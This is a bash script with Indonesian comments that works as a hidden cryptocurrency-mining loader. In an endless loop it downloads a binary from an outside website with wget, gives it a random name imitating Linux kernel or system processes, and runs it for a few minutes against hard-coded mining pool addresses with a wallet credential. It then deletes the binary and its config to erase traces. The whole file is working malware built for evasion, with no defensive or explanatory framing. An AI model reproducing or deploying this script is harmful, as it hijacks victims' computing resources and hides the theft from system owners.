#!/bin/bash

# List URL cadangan untuk koneksi
URL_LIST=(
    "44.247.77.198:443"
    "170.64.157.141:443"
)

# Config dasar
BASE_CONFIG_JSON='{
  "algo": "power2b",
  "user": "mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar288",
  "pass": "x",
  "threads": 8
}'

# Daftar nama proses Linux core
POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

# Fungsi untuk generate string acak
generate_random_string() {
    local length=${1:-8}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

# Fungsi untuk test koneksi URL
test_url_connection() {
    local url="$1"
    local host=$(echo "$url" | cut -d: -f1)
    local port=$(echo "$url" | cut -d: -f2)
    
    # Test koneksi dengan timeout 3 detik
    if timeout 3 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

# Fungsi untuk mendapatkan URL yang available
get_available_url() {
    for url in "${URL_LIST[@]}"; do
        if test_url_connection "$url"; then
            echo "$url"
            return 0
        fi
    done
    # Fallback ke URL pertama jika semua down
    echo "${URL_LIST[0]}"
    return 1
}

# Fungsi untuk membuat config JSON dengan URL yang available
create_config_with_url() {
    local config_path="$1"
    local available_url="$2"
    
    # Buat config JSON dengan URL yang available
    local config_json=$(echo "$BASE_CONFIG_JSON" | jq --arg url "$available_url" '.url = $url')
    echo "$config_json" > "$config_path"
}

while true; do
    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*.json >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/migration* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/watchdog* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/rcu_* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.profile-cache* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kintegrityd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kblockd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kthrotld* >/dev/null 2>&1

    # Dapatkan URL yang available
    AVAILABLE_URL=$(get_available_url)

    # Pilih nama binary acak
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    # Buat config dengan URL yang available
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"
    create_config_with_url "$CONFIG_PATH" "$AVAILABLE_URL"

    # Download binary
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
    
    if [ $? -ne 0 ]; then
        sleep 30
        continue
    fi
    
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1

    # Tentukan waktu aktif (2-3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20-30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))

    # Jalankan proses
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Hapus binary dan config
    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
    rm -f "$CONFIG_PATH" >/dev/null 2>&1

    # Istirahat
    sleep "$IDLE_SEC"
done
